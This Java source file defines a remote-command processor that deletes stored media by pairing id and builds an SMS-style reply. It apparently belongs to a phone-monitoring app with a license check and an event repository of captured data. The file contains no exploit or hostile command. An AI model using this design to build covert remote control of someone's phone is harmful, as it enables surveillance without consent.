package com.vvt.remotecommandmanager.processor.media;

import com.vvt.appcontext.AppContext;
import com.vvt.datadeliverymanager.Customization;
import com.vvt.eventrepository.FxEventRepository;
import com.vvt.exceptions.database.FxDbIdNotFoundException;
import com.vvt.license.LicenseInfo;
import com.vvt.license.LicenseStatus;
import com.vvt.logger.FxLog;
import com.vvt.remotecommandmanager.MessageManager;
import com.vvt.remotecommandmanager.ProcessingType;
import com.vvt.remotecommandmanager.RemoteCommandData;
import com.vvt.remotecommandmanager.exceptions.InvalidCommandFormatException;
import com.vvt.remotecommandmanager.exceptions.RemoteCommandException;
import com.vvt.remotecommandmanager.processor.ProcessingResult;
import com.vvt.remotecommandmanager.processor.RemoteCommandProcessor;

public class DeleteActualMediaProcessor extends RemoteCommandProcessor {
	private static final String TAG = "DeleteActualMediaProcessor";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGE = Customization.ERROR;
	
	private static final int INDEX_OF_PAIRING_ID = 0;
	
	private FxEventRepository mEventRepository;
	private String mRecipientNumber;
	private ProcessingResult mReplyMessage;
	private StringBuilder mReplyMessageBuilder;
	private LicenseInfo mLicenseInfo;
	
	public DeleteActualMediaProcessor(AppContext appContext, FxEventRepository eventRepository,
			LicenseInfo licenseInfo) {
		super(appContext, eventRepository);
		
		mEventRepository = eventRepository;
		mReplyMessage = new ProcessingResult();
		mLicenseInfo = licenseInfo;
	}

	@Override
	public ProcessingType getProcessingType() {
		return ProcessingType.SYNC;
	}

	@Override
	protected void doProcessCommand(RemoteCommandData commandData)
			throws RemoteCommandException {
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ENTER ...");
		mReplyMessageBuilder = new StringBuilder();
		
		int mParingId = -1;
		
		if(commandData.getArguments().size() != 1) {
			if(LOGE) FxLog.e(TAG, "commandData arguments count invalid");
			throw new InvalidCommandFormatException();
		}
		
		if(commandData.isSmsReplyRequired()) {
			mRecipientNumber = commandData.getSenderNumber();
		}
		
		try{
			mParingId = Integer.parseInt(commandData.getArguments().get(INDEX_OF_PAIRING_ID));
		}
		catch(NumberFormatException nfe) {
			if(LOGE) FxLog.e(TAG, "Erorr occured getting the pairing id value");
			throw new InvalidCommandFormatException();
		}
		
		if(mParingId < 0) {
			if(LOGE) FxLog.e(TAG, "Invalid pairing id value");
			throw new InvalidCommandFormatException();
		}
		
		if(mLicenseInfo.getLicenseStatus() == LicenseStatus.DISABLED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_DISABLED_WARNING).append(System.getProperty("line.separator"));
		} else if (mLicenseInfo.getLicenseStatus() == LicenseStatus.EXPIRED) {
			mReplyMessageBuilder.append(MessageManager.LICENSE_EXPIRED_WARNING).append(System.getProperty("line.separator"));
		}
		
		try {
			mEventRepository.deleteActualMedia(mParingId);
			
			mReplyMessage.setIsSuccess(true);
			mReplyMessageBuilder.append(MessageManager.DELETE_ACTUAL_MEDIA_COMPLETE);
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
			
		} catch (FxDbIdNotFoundException e) {
			mReplyMessage.setIsSuccess(false);
			mReplyMessageBuilder.append(String.format(MessageManager.DELETE_ACTUAL_MEDIA_PAIRING_ID_NOT_FOUND, mParingId));
			mReplyMessage.setMessage(mReplyMessageBuilder.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "doProcessCommand # IsSuccess : " + mReplyMessage.isSuccess());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # ReplyMessage : " + mReplyMessage.getMessage());
		if(LOGV) FxLog.v(TAG, "doProcessCommand # EXIT ...");
	}

	@Override
	protected String getRecipientNumber() {
		return mRecipientNumber;
	}

	@Override
	protected ProcessingResult getReplyMessage() {
		return mReplyMessage;
	}
	
	
}
